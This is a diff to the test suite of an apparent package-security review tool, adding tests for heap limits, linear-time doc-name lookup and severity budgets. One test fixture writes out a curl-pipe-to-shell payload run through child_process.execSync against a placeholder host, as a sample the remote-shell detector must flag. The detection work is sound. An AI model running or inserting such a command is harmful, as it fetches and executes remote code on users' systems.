@@ -6,6 +6,13 @@ import {
   deterministicFindings,
   tarSuspiciousEntryFindings,
 } from "../server/lib/review";
+import {
+  distinctTokenText,
+  loadCallArgumentText,
+  neverSampledBundleSeverity,
+  reviewEntrypoint,
+  runUnderHeapLimit,
+} from "./helpers/heap-limited-review.mjs";
 
 describe("review", () => {
   test("diff highlights added modified and removed package files", () => {
@@ -895,22 +902,63 @@ describe("review", () => {
     expect(process.memoryUsage().heapUsed - heapBefore).toBeLessThan(512 * 1024 * 1024);
   }, 60_000);
 
-  test("load-call arguments full of distinct tokens keep only names a file can be looked up by", () => {
-    let calls = "";
-    for (let index = 0; calls.length < 12_000_000;) {
-      let args = "";
-      while (args.length < 280) args += `t${(index++).toString(36)} `;
-      calls += `require(${args})\n`;
-    }
-    const staged = [
-      { path: "package.json", size: 1, sha256: "p", flags: [], textSample: '{"main":"index.js"}' },
-      { path: "index.js", size: calls.length, sha256: "i", flags: [], textSample: calls },
-      { path: "docs/guide.md", size: 1, sha256: "d", flags: [], textSample: "# guide" },
-    ];
-    const heapBefore = process.memoryUsage().heapUsed;
-    deterministicFindings(staged, createPackageDiff([], staged));
-    expect(process.memoryUsage().heapUsed - heapBefore).toBeLessThan(64 * 1024 * 1024);
+  test("load-call arguments full of distinct tokens keep only names a file can be looked up by", async () => {
+    // Keeping one string per argument token outgrows an 80 MB heap.
+    await expect(runUnderHeapLimit("loadCallArguments", 80)).resolves.toBeGreaterThanOrEqual(0);
+    const payload = "require('child_process').execSync('curl https://example.invalid/x | sh');\n";
+    const data = [{ path: "data.map", size: 1, sha256: "m", flags: [], textSample: payload }];
+    const remoteShell = (text) =>
+      reviewEntrypoint(text, data).some(
+        (finding) => finding.ruleId === "code.remote-shell" && finding.file === "data.map",
+      );
+    const calls = loadCallArgumentText(100_000);
+    expect(remoteShell(calls)).toBe(false);
+    expect(remoteShell(`${calls}require('./DATA.map');\n`)).toBe(true);
   }, 60_000);
+
+  test("looks for thousands of unlisted doc names in megabytes of near-miss code in linear time", () => {
+    const record = (path, textSample) => ({ path, size: 1, sha256: path, flags: [], textSample });
+    const manifest = { name: "pkg", version: "1.0.0", main: "index.js", files: ["index.js"] };
+    // Every position starts a near miss of every `zq<n>.md`, which a substring
+    // search per doc pays for in full.
+    const staged = [
+      record("package.json", JSON.stringify(manifest)),
+      record("index.js", `${"zq".repeat(4_000_000)}\nread("ZQ7.md");\n`),
+      ...Array.from({ length: 4_000 }, (_, index) => record(`docs/zq${index}.md`, "# notes")),
+    ];
+    const started = performance.now();
+    const outside = deterministicFindings(staged, createPackageDiff([], staged)).filter(
+      (finding) => finding.ruleId === "file.outside-files-list",
+    );
+    expect(performance.now() - started).toBeLessThan(8_000);
+    expect(outside).toHaveLength(4_000);
+    expect(
+      outside.filter((finding) => finding.severity !== "low").map((finding) => finding.file),
+    ).toEqual(["docs/zq7.md"]);
+  }, 60_000);
+
+  test("unlisted docs keep their severity once looking for their names runs out of budget", () => {
+    const record = (path, textSample) => ({ path, size: 1, sha256: path, flags: [], textSample });
+    const manifest = { name: "pkg", version: "1.0.0", main: "index.js", files: ["index.js"] };
+    // Sixty name lengths end at every `.md`, so each mention costs every one.
+    const docs = Array.from({ length: 60 }, (_, index) =>
+      record(`docs/${"n".repeat(index + 1)}.md`, "# notes"),
+    );
+    const severities = (mentions) => {
+      const staged = [
+        record("package.json", JSON.stringify(manifest)),
+        record("index.js", ".md ".repeat(mentions)),
+        ...docs,
+      ];
+      return new Set(
+        deterministicFindings(staged, createPackageDiff([], staged))
+          .filter((finding) => finding.ruleId === "file.outside-files-list")
+          .map((finding) => finding.severity),
+      );
+    };
+    expect(severities(100)).toEqual(new Set(["low"]));
+    expect(severities(20_000)).toEqual(new Set(["high"]));
+  });
 
   test("a comment-only change does not make an existing credential read part of the release", () => {
     const previousFiles = [
@@ -2635,26 +2683,12 @@ describe("review", () => {
     ).toBe("info");
   });
 
-  test("finds a never-sampled bundle named among millions of distinct tokens", () => {
-    const entries = [
-      { kind: "retention-tier", path: "<archive>", detail: "1 file body was hash-only" },
-    ];
-    const fileDiff = [{ path: "dist/app.min.js", status: "modified", flags: ["content-skipped"] }];
-    const tokens = Array.from({ length: 1_500_000 }, (_, index) => `t${index.toString(36)}`);
-    const severity = (text) =>
-      tarSuspiciousEntryFindings(entries, {
-        fileDiff,
-        stagedFiles: [
-          { path: "dist/app.min.js", flags: ["content-skipped"] },
-          { path: "package.json", flags: [], textSample: '{"main":"index.js"}' },
-          { path: "index.js", flags: [], textSample: text },
-        ],
-      })[0].severity;
-
-    const started = performance.now();
-    expect(severity(tokens.join(" "))).toBe("info");
-    expect(severity(`${tokens.join(" ")} require('./dist/APP.MIN')`)).toBe("medium");
-    expect(performance.now() - started).toBeLessThan(10_000);
+  test("finds a never-sampled bundle named among millions of distinct tokens", async () => {
+    // Indexing every token outgrows an 80 MB heap.
+    await expect(runUnderHeapLimit("neverSampledBundle", 80)).resolves.toBe("info");
+    const tokens = distinctTokenText(100_000);
+    expect(neverSampledBundleSeverity(tokens)).toBe("info");
+    expect(neverSampledBundleSeverity(`${tokens} require('./dist/APP.MIN')`)).toBe("medium");
   }, 60_000);
 
   test("escalates the retention-tier notice when an uninspected text tail file changed beside binaries", () => {
